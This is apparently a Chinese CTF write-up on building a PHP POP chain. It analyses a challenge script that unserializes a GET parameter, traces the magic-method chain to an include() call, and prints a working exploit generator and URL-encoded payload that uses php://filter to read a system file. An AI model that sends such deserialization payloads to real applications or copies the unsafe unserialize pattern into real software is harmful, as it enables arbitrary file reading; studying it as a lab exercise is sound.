---
title: PHP构造POP链小练习
published: 2021-11-09 14:41
category: Web
draft: false
tags: [PHP, POP链, CTF]
---

# PHP构造POP链小练习

## 题目

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class Vox{
    protected $headset;
    public $sound;
    public function fun($pulse){
        include($pulse);
    }
    public function __invoke(){
        $this->fun($this->headset);
    }
}

class Saw{
    public $fearless;
    public $gun;
    public function __construct($file='index.php'){
        $this->fearless = $file;
        echo $this->fearless . ' You are in my range!'."<br>";
    }

    public function __toString(){
        $this->gun['gun']->fearless;
        return "Saw";
    }

    public function _pain(){
        if($this->fearless){
            highlight_file($this->fearless);
        }
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|php|\.\./i", $this->fearless)){
            echo "Does it hurt? That's right";
            $this->fearless = "index.php";
        }
    }
}

class Petal{
    public $seed;
    public function __construct(){
        $this->seed = array();
    }

    public function __get($sun){
        $Nourishment = $this->seed;
        return $Nourishment();
    }
}

if(isset($_GET['ozo'])){
    unserialize($_GET['ozo']);
}
else{
    $Saw = new Saw('index.php');
    $Saw->_pain();
}
?>
```

首先确定最终目的是控制include($pulse)，控制包含点即可利用伪协议构造任意文件读取

```assembly
然后一步步反推Vox::__invoke() -> Vox::fun()
而触发__invoke()的条件是将实例对象当作方法调用时触发，Petal::__get()中的return $Nourishment();满足条件
只要赋值一个对象给$this->seed即可触发，继续分析Petal::__get()的触发条件是调用不可访问的属性或者方法时被触发
Saw::__toString()中的$this->gun['gun']->fearless可满足
最后就是如何触发Saw::__toString()，Saw::__wakeup()中，进行了正则匹配
如果将$this->fearless设置成一个对象，即可触发Saw::__toString()。
```

```assembly
利用链：Saw::__wakeup() -> Saw::__toString() -> Petal::__get() -> Vox::__invoke() -> Vox::fun()
```

## POP链

```php
<?php
class Vox
{
    protected $headset = "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini";
}

class Saw
{
    public $fearless;
    public $gun;
}

class Petal
{
    public $seed;
}

$Vox = new Vox();
$Saw1 = new Saw();
$Saw2 = new Saw();
$Petal = new Petal();

$Saw1->fearless = $Saw2;
$Saw2->gun['gun'] = $Petal;
$Petal->seed = $Vox;

echo urlencode(serialize($Saw1));
```

```php
O%3A3%3A%22Saw%22%3A2%3A%7Bs%3A8%3A%22fearless%22%3BO%3A3%3A%22Saw%22%3A2%3A%7Bs%3A8%3A%22fearless%22%3BN%3Bs%3A3%3A%22gun%22%3Ba%3A1%3A%7Bs%3A3%3A%22gun%22%3BO%3A5%3A%22Petal%22%3A1%3A%7Bs%3A4%3A%22seed%22%3BO%3A3%3A%22Vox%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00headset%22%3Bs%3A67%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dc%3A%2Fwindows%2Fwin.ini%22%3B%7D%7D%7D%7Ds%3A3%3A%22gun%22%3BN%3B%7D
```

